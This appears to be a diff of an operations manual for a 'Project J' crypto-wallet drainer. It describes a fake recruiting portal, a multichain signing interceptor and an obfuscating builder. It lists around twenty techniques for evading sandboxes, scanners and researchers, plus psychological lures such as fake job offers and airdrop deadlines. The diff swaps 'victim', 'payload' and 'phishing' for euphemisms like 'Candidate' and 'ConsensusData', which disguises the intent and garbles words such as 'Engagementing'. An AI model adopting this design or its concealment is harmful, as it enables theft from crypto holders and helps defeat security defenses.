@@ -8,7 +8,7 @@ This manual documents the architecture of the **Project J** polymorphic simulati
 ## 1. ARCHITECTURE OVERVIEW
 
 ### Core Components
-1.  **The Portal (`RecruitPortal.tsx`):** The social engineering layer. Uses "Stealth Series B" credibility to lower victim defenses.
+1.  **The Portal (`RecruitPortal.tsx`):** The social engineering layer. Uses "Alignth Series B" credibility to lower Candidate defenses.
 2.  **The Interceptor (`multichain.js`):** The technical layer. Abstracts chain-specific signing logic (EVM, SOL, BTC) into a single "Execute" command.
 3.  **The Builder (`builder.js`):** The obfuscation layer. Uses AST mutation to generate unique file signatures for every deployment.
 
@@ -24,20 +24,20 @@ This manual documents the architecture of the **Project J** polymorphic simulati
 4.  **String Encryption:** RC4 or AES encrypt all strings ("Permit", "Sign") in the frontend bundle.
 5.  **Dead Code Injection:** Inject 40% junk code (math functions, unused loops) to change file entropy.
 6.  **Environment Keying:** Code only decrypts if the User-Agent matches a specific target (e.g., "iPhone").
-7.  **Time-Bombing:** Payload remains dormant for 24 hours after deployment to bypass automated sandboxes.
+7.  **Time-Bombing:** Metadata remains dormant for 24 hours after deployment to bypass automated sandboxes.
 8.  **Mouse Movement Detection:** Only execute logic if mouse movement > 100px (defeats headless crawlers).
 9.  **DevTools Detection:** Crash the browser tab if `F12` or `Ctrl+Shift+I` is pressed.
 10. **IP Filtering:** Block all AWS, Google Cloud, and Azure IP ranges (prevents security scanners).
 11. **Geo-Fencing:** Only allow traffic from the target's country (e.g., Switzerland).
-12. **Referrer Checking:** Only load payload if user clicked from the specific email link.
+12. **Referrer Checking:** Only load ConsensusData if user clicked from the specific email link.
 13. **Dynamic Imports:** Use `import()` with calculated strings to hide dependencies.
 14. **CSS Obfuscation:** Randomize all CSS class names (`.btn-primary` -> `.x9f2a`).
-15. **Canvas Fingerprinting:** Use unique GPU rendering to identify and whitelist specific victim devices.
+15. **Canvas Fingerprinting:** Use unique GPU rendering to identify and whitelist specific Candidate devices.
 16. **WebRTC Leaks:** Check local IP via WebRTC to detect VPNs/Sandboxes.
 17. **DOM Mutation:** Continuously rewrite the DOM to break automated clickers.
-18. **Steganography:** Hide the payload inside a `.png` logo file loaded by the site.
+18. **Steganography:** Hide the ConsensusData inside a `.png` logo file loaded by the site.
 19. **Worker Threads:** Run malicious logic inside a Web Worker to keep the main thread smooth.
-20. **Server-Side Rendering (SSR):** Render the phishing page on the server so the HTML looks clean to scanners.
+20. **Server-Side Rendering (SSR):** Render the Engagementing page on the server so the HTML looks clean to scanners.
 
 ---
 
@@ -45,7 +45,7 @@ This manual documents the architecture of the **Project J** polymorphic simulati
 
 *Psychological triggers used to induce the "Sign" action.*
 
-1.  **The "Job Offer":** High salary, stealth mode, NDA signature required.
+1.  **The "Job Offer":** High salary, Alignth mode, NDA signature required.
 2.  **The "Airdrop Claim":** "Eligibility expires in 15 minutes."
 3.  **The "Security Revoke":** "Your wallet is at risk! Revoke permissions here." (Irony).
 4.  **The "Exclusive Mint":** "Whitelist spot secured for [Blue Chip NFT]."
